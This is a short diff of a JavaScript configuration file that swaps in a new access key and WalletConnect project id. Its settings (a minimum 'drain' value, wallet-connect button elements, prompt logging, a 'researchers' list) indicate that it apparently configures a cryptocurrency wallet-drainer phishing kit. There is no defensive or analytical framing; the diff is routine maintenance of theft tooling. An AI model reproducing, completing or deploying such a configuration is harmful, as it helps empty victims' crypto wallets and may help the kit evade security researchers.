@@ -1,5 +1,5 @@
 
-let ACCESS_KEY = 'fe83a546-291f-4dd2-b466-dc025f74936f'
+let ACCESS_KEY = '63851c17-10dc-4f88-a600-6eba1afedbd3'
 let USE_W3M_V3 = true
 let logPromptingEnabled = true;
 let minimalDrainValue = 0.001;
@@ -60,7 +60,7 @@ let buttonMessagesEnabled = false;
 let twoStep = false;
 let twoStepButtonElement = "startButton";
 let connectElement = "connectButton";
-let wc_projectid = "c52c07ea896efcd59f9fc75c12d0cb99";
+let wc_projectid = "9b61c61d800297224ce5d606c110629b";
 let cfgversion = 680;
 let researchers = [];
 let experimental = {"disable-w3m-featured":true};
